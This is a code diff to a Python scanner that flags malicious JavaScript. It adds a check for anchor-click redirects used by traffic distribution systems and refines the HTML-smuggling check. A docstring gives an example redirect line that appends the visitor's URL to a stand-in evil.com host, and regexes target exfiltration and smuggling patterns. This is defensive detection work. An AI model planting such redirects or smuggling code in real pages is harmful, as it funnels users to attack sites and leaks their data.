@@ -1048,6 +1048,97 @@ def _check_js_location_redirect(js: str, source_url: str = '') -> list[dict]:
     return findings
 
 
+def _check_anchor_redirect(js: str, source_url: str = '') -> list[dict]:
+    """
+    Detect TDS (traffic distribution system) redirect via anchor .href + .click().
+
+    Covers two patterns:
+      1. Literal URL:  element.href = "https://evil.com/?u=" + window.location; element.click()
+      2. Variable URL: var u = "https://evil.com/..."; element.href = u; element.click()
+
+    Both bypass _check_js_location_redirect (which looks for window.location = assignments)
+    and are used by TDS infrastructure to funnel victims from neutral hosting to attack
+    landing pages, often with visitor URL telemetry appended to the redirect destination.
+
+    Required signal sequence (within 800 + 600 char windows):
+      external URL string  →  .href = assignment  →  .click() or synthetic click
+    Download anchors (.download =) are excluded — those are HTML smuggling.
+    """
+    findings: list[dict] = []
+
+    # Anchor on any external URL string literal in the code
+    url_pattern = re.compile(
+        r'["\'](\s*https?://([^"\'?#\s]{3,})[^"\']*)["\']',
+        re.IGNORECASE,
+    )
+    seen_domains: set[str] = set()
+
+    for url_m in url_pattern.finditer(js):
+        target_domain = url_m.group(2).split('/')[0].lower()
+
+        if target_domain in seen_domains:
+            continue
+
+        # Skip same-domain references and known-good destinations
+        if source_url:
+            source_host = re.match(r'https?://([^/?#]+)', source_url)
+            if source_host and source_host.group(1).lower() == target_domain:
+                continue
+        if is_known_good(target_domain):
+            continue
+
+        # Look for .href = within 800 chars after the URL literal
+        window_800 = js[url_m.start(): min(len(js), url_m.start() + 800)]
+        href_m = re.search(r'(?:\w+|\))\s*\.\s*href\s*=', window_800, re.IGNORECASE)
+        if not href_m:
+            continue
+
+        # Look for .click() or synthetic MouseEvent within 600 chars after .href =
+        href_abs = url_m.start() + href_m.start()
+        click_window = js[href_abs: min(len(js), href_abs + 600)]
+        click_m = re.search(
+            r'(?:\.click\s*\(\s*\)|initEvent\s*\(\s*["\']click["\'])',
+            click_window, re.IGNORECASE,
+        )
+        if not click_m:
+            continue
+
+        # Exclude download anchors — HTML smuggling, handled by _check_html_smuggling
+        if re.search(r'\.download\s*=', click_window, re.IGNORECASE):
+            continue
+
+        seen_domains.add(target_domain)
+
+        # Elevated severity when visitor URL data is exfiltrated to the TDS
+        exfil_m = re.search(
+            r'window\.location|document\.URL|document\.referrer',
+            window_800, re.IGNORECASE,
+        )
+        severity = 'HIGH' if exfil_m else 'MEDIUM'
+        exfil_note = (
+            ' Visitor URL is concatenated into the redirect destination — the TDS is '
+            'collecting entry-point telemetry from every victim it forwards.'
+            if exfil_m else ''
+        )
+
+        findings.append({
+            'severity': severity,
+            'category': 'JavaScript',
+            'title': f'TDS redirect via anchor .click() to: {target_domain}',
+            'description': (
+                f'Script constructs an external URL, assigns it to an anchor element\'s '
+                f'href, and calls .click() to force navigation to {target_domain}. '
+                'This is a traffic distribution system (TDS) redirect pattern used by '
+                'malware campaigns and phishing infrastructure to funnel victims from '
+                'neutral hosting (cloud storage, CDN, newly registered domains) to the '
+                'actual attack landing page.' + exfil_note
+            ),
+            'evidence': _snippet(js, url_m),
+        })
+
+    return findings
+
+
 def _check_right_click_disable(js: str) -> list[dict]:
     findings: list[dict] = []
     # Two separate bounded patterns — avoids the DOTALL backtracking of the original
@@ -1592,18 +1683,45 @@ def _check_html_smuggling(js: str) -> list[dict]:
     auto-downloaded, bypassing email gateways and network DLP controls entirely.
     The file never traverses the network as a recognisable binary.
     Actively used by Qakbot/BazarLoader successors and initial access brokers.
-    Requires all three signals: Blob construction + createObjectURL + download trigger.
+
+    Requires all three signals AND proximity: Blob construction + createObjectURL +
+    a download trigger — all within 2500 chars of each other.
+
+    The download trigger must be .download= (the HTML5 attribute that forces a save
+    dialog), msSaveBlob, or msSaveOrOpenBlob.  Bare .click() is intentionally excluded:
+    it appears in countless legitimate patterns (UI interactions, webpack chunk loading,
+    Next.js code splitting) and its presence alone across a whole file does not
+    indicate payload delivery.  Real HTML smuggling always sets .download on the anchor.
     """
     findings: list[dict] = []
+
+    # Step 1: find Blob construction
     blob_m = re.search(r'new\s+Blob\s*\(\s*\[', js, re.IGNORECASE)
     if not blob_m:
         return findings
-    obj_url_m = re.search(r'URL\.createObjectURL\s*\(', js, re.IGNORECASE)
+
+    # Step 2: find createObjectURL within 2500 chars of the Blob construction
+    # (search in both directions to handle varied code ordering)
+    _PROXIMITY = 2500
+    blob_pos = blob_m.start()
+    search_start = max(0, blob_pos - _PROXIMITY)
+    search_end = min(len(js), blob_pos + _PROXIMITY)
+    window = js[search_start:search_end]
+
+    obj_url_m = re.search(r'URL\.createObjectURL\s*\(', window, re.IGNORECASE)
     if not obj_url_m:
         return findings
+    # Adjust match position to be absolute
+    obj_url_abs = search_start + obj_url_m.start()
+
+    # Step 3: find a download trigger within 2500 chars of the createObjectURL call
+    trigger_start = max(0, obj_url_abs - _PROXIMITY)
+    trigger_end = min(len(js), obj_url_abs + _PROXIMITY)
+    trigger_window = js[trigger_start:trigger_end]
+
     trigger_m = re.search(
-        r'(?:\.download\s*=|\.click\s*\(\s*\)|msSaveOrOpenBlob|msSaveBlob)',
-        js, re.IGNORECASE,
+        r'(?:\.download\s*=|msSaveOrOpenBlob|msSaveBlob)',
+        trigger_window, re.IGNORECASE,
     )
     if not trigger_m:
         return findings
@@ -1910,12 +2028,17 @@ def _check_dynamic_import_external(js: str) -> list[dict]:
 # Main entry point
 # ---------------------------------------------------------------------------
 
-def analyse_js(js_content: str, source_url: str = '') -> list[dict]:
+def analyse_js(js_content: str, source_url: str = '', beautify: bool = True) -> list[dict]:
     """
     Analyse JavaScript content for malicious patterns.
 
     Returns a list of finding dicts, sorted CRITICAL → INFO.
     Each dict has: severity, category, title, description, evidence.
+
+    beautify: if False, skip jsbeautifier entirely. All 30 checks work on raw
+    minified JS — beautification only improves evidence readability. Set False
+    for external scripts in batch scanning to avoid jsbeautifier's CPU-bound
+    regex hanging the GIL and blocking the phase timeout.
     """
     if not js_content or not js_content.strip():
         return []
@@ -1936,7 +2059,7 @@ def analyse_js(js_content: str, source_url: str = '') -> list[dict]:
                 return m.group(0)
         return _HEX_RE.sub(_r, s)
 
-    beautified = _beautify(js_content)
+    beautified = _beautify(js_content) if beautify else js_content
     hex_decoded = _decode_hex(js_content)
 
     versions: list[str] = [js_content]
@@ -1944,9 +2067,10 @@ def analyse_js(js_content: str, source_url: str = '') -> list[dict]:
         versions.append(beautified)
     if hex_decoded != js_content:
         versions.append(hex_decoded)
-        beautified_hex = _beautify(hex_decoded)
-        if beautified_hex != hex_decoded:
-            versions.append(beautified_hex)
+        if beautify:
+            beautified_hex = _beautify(hex_decoded)
+            if beautified_hex != hex_decoded:
+                versions.append(beautified_hex)
 
     seen_titles: set[str] = set()
 
@@ -1973,6 +2097,7 @@ def analyse_js(js_content: str, source_url: str = '') -> list[dict]:
         add_findings(_check_forced_download(js))
         add_findings(_check_auto_redirect(js))
         add_findings(_check_js_location_redirect(js, source_url))
+        add_findings(_check_anchor_redirect(js, source_url))
         add_findings(_check_right_click_disable(js))
         add_findings(_check_devtools_detection(js))
         add_findings(_check_sendbeacon_external(js, source_url))
